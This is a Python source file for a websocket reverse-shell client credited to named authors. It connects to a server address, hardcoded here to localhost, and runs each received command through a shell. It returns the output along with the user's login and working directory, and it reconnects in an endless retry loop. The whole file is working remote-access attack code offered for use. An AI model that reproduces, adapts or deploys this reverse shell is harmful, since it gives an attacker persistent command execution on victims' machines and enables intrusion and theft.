"""
    | - Intelligent Websocket Reverse shell Client - |
            | -  Made by NiGhTFuRy, Vexius - |
                | ~ Refactored by VEX ~ |
"""


import os
import asyncio
import websockets
from threading import Thread
import time
from subprocess import Popen, DEVNULL, STDOUT, PIPE

class CmdManager:
    """A class-based context manager for checking commands"""
    def __init__(self, cmd):
        self.cmd = cmd
    
    def _check_cmd(self, cmd):
        """Checks all incoming commands"""
        cmd = cmd.strip().split()

        if cmd and cmd[0] not in ["cmd","powershell"]:
            if cmd[0] == "cd" or ":" in cmd[0]:
                return self._check_cd(cmd)
            else:
                return self._check_other_cmd(cmd)
        elif cmd and cmd[0] in ["cmd","powershell"]:
            return "you can't spawn a new shell (cmd or powershell)"
        else:
            return "ok"

    def _check_cd(self, cmd):
        """Manages change directory commads"""
        try:
            if len(cmd) > 1:
                if cmd[1] != "..":
                    os.chdir(cmd[1])
                else:
                    os.chdir(cmd[1] + "\\")
            elif ":" in cmd[0]:
                os.chdir(cmd[0])
        except Exception as e:
            return str(e)
        else:
            return "ok"

    def _check_other_cmd(self, cmd):
        """Manages other commads"""
        print(f"\n\tcommand |{cmd}|\n")
        try:
            r = Popen( " ".join(cmd), stdout=PIPE, stderr=STDOUT, stdin=DEVNULL, shell=True)
            out, err = r.communicate()
            return out.decode("utf-8") 
        except Exception as e:
            return str(e)

    def __enter__(self):
        self.result = self._check_cmd(self.cmd)
        return self.result

    def __exit__(self, exc_type, exc_val, exc_tb):
        pass

class Client:
    """Client class that manages overall behavior"""
    def __init__(self, uri):
        self._uri = uri
        
        self._cc = {
            'OKBLUE' : '\033[94m',
            'FAIL' : '\033[91m',
            'ENDC' : '\033[0m',
        }

    def _pwd(self):
        """Returns the current path"""
        return (self._cc["OKBLUE"] + "("+ self._cc["FAIL"] +f"{os.getlogin()}💀windows"+ 
                self._cc["ENDC"] + self._cc["OKBLUE"] + ")-[" + self._cc["ENDC"] + 
                f"{os.getcwd()}" + self._cc["OKBLUE"] + "]>" + self._cc["ENDC"])

    async def _connect(self, bug=False):
        """Manages the connection (websocket)"""
        async with websockets.connect(self._uri) as ws:
            await ws.send(self._pwd())
            if bug:
                pass
            while True:
                try:
                    cmd = await ws.recv()
                    with CmdManager(cmd) as result:
                        if result != "ok":
                            await ws.send(result)
                        await ws.send(self._pwd())
                except websockets.exceptions.ConnectionClosedError:
                    await self._connect(bug=True)
                except websockets.ConnectionClosedOK:
                    break

    def run(self):
        """Runs the client"""
        asyncio.run(self._connect())

def start():
    address = "ws://127.0.0.1:8765"
    client = Client(address)
    client.run()
    
if __name__ == "__main__":
    while True:
        try:
            print("Creating new worker...")
            p = Thread(target=start)
            p.start()
            p.join()
            print("Worker terminated\n")
        except:
            time.sleep(2)
            pass